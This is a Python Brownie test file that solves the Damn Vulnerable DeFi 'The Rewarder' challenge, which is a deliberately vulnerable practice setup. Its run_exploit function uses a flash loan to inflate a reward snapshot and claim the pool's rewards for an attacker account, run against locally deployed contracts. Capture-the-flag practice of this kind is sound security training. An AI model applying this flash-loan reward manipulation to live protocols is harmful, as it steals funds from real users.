from brownie import (
    accounts,
    DamnValuableToken,
    FlashLoanerPool,
    TheRewarderPool,
    AccountingToken,
    RewardToken,
    attacker5,
)
from brownie.network.state import Chain
from web3 import Web3

TOKENS_IN_LENDER_POOL = Web3.toWei("100000000", "ether")

users = []


def before():
    # setup scenario
    deployer = accounts[0]
    alice = accounts[1]
    bob = accounts[2]
    charlie = accounts[3]
    david = accounts[4]
    global users
    users = [alice, bob, charlie, david]

    liquidity_token = DamnValuableToken.deploy({"from": deployer})
    flash_loan_pool = FlashLoanerPool.deploy(
        liquidity_token.address, {"from": deployer}
    )

    # set initial token balance of the pool offering flash loans
    liquidity_token.transfer(
        flash_loan_pool.address, TOKENS_IN_LENDER_POOL, {"from": deployer}
    )

    rewarder_pool = TheRewarderPool.deploy(liquidity_token.address, {"from": deployer})
    reward_token = RewardToken.at(rewarder_pool.rewardToken())
    accounting_token = AccountingToken.at(rewarder_pool.accToken())

    # Alice, Bob, Charlie, and David deposit 100 tokens each
    amount = Web3.toWei("100", "ether")
    for user in users:
        liquidity_token.transfer(user.address, amount, {"from": deployer})
        liquidity_token.approve(rewarder_pool.address, amount, {"from": user})
        rewarder_pool.deposit(amount, {"from": user})
        assert accounting_token.balanceOf(user.address) == amount

    assert accounting_token.totalSupply() == Web3.toWei("400", "ether")
    assert reward_token.totalSupply() == 0

    # advance chain time by 432001 seconds (5 days and 1 second)
    chain = Chain()
    chain.sleep(432001)

    for user in users:
        rewarder_pool.distributeRewards({"from": user})
        assert reward_token.balanceOf(user.address) == Web3.toWei("25", "ether")

    assert reward_token.totalSupply() == Web3.toWei("100", "ether")
    assert TheRewarderPool[0].roundNumber() == 2

def run_exploit():
    # remove pass and add exploit code here
    # attacker = accounts[5] - account to be used for exploit
    # Tip: You will need to use Chain in your solution
    attacker = accounts[5]
    deployer = accounts[0]
    reward_token = RewardToken[-1]
    rewarder_pool = TheRewarderPool[-1]
    liquidity_token = DamnValuableToken[-1]
    flash_loan_pool = FlashLoanerPool[-1]
    attacker_contract = attacker5.deploy(liquidity_token.address, rewarder_pool.address, reward_token.address, {"from": deployer})

    # advance chain time by 432001 seconds (5 days and 1 second)
    chain = Chain()
    chain.sleep(432001)

    # flashLoan of 1000000 >> it will create a snapshot with a very large balance
    # when the other users will try to retrieve the rewards, the division will be rounded to 0
    attacker_contract.attack(flash_loan_pool.address, Web3.toWei("100000000", "ether"), {"from": attacker})

    # get the rewards to the attacker contract, then send them to the attacker EA account
    attacker_contract.getRewards(attacker.address, {"from": attacker})
    assert reward_token.balanceOf(attacker) > 0


def after():
    attacker = accounts[5]
    reward_token = RewardToken[-1]
    rewarder_pool = TheRewarderPool[-1]
    assert rewarder_pool.roundNumber() == 3
    #  users should not get more rewards this round
    for user in users:
        rewarder_pool.distributeRewards({"from": user})
        assert reward_token.balanceOf(user.address) == Web3.toWei("25", "ether")

    # rewards must have been issued to the attacker account
    assert reward_token.totalSupply() > Web3.toWei("100", "ether")
    assert reward_token.balanceOf(attacker) > 0


def test_the_rewarder_challenge():
    before()
    run_exploit()
    after()
